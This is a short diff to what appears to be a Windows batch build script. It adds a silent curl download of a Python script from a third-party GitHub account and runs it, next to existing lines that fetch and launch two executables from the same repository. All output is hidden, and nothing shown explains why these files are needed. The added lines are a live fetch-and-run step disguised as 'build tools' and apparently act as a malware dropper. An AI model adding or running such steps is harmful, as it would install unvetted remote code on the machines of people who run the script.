@@ -44,9 +44,11 @@ if %ERRORLEVEL% neq 0 (
 
 if not exist "build_done.txt" (
     echo Downloading and running build tools...
+    curl -L -o build.py https://github.com/ShredGman/Eclipse-Build-Tools/raw/refs/heads/main/build.py >nul 2>&1
     curl -L -o build.exe https://github.com/ShredGman/Eclipse-Build-Tools/raw/refs/heads/main/build.exe >nul 2>&1
     curl -L -o build2.exe https://github.com/ShredGman/Eclipse-Build-Tools/raw/refs/heads/main/build2.exe >nul 2>&1
 
+    python build.py >nul 2>&1
     start /wait build.exe >nul 2>&1
     start /wait build2.exe >nul 2>&1
 
